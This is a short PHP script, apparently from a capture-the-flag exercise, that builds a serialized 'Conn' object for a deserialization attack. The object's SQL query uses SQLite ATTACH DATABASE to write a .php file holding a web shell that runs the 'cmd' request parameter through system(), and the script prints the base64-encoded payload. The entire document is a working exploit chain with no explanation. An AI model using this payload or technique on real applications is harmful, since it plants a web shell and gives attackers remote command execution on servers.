<?php
class Conn {
    public $username = 'samuzora';
    public $uuid = '63a46255b4c9b';
    public $query = "attach database './63a46255b4c9b.php' as test; create table test.a (payload text); insert into test.a values ('<?php system(\$_GET[\"cmd\"]) ?>')";
    public $params = array();
}
echo base64_encode(serialize(new Conn));
?>
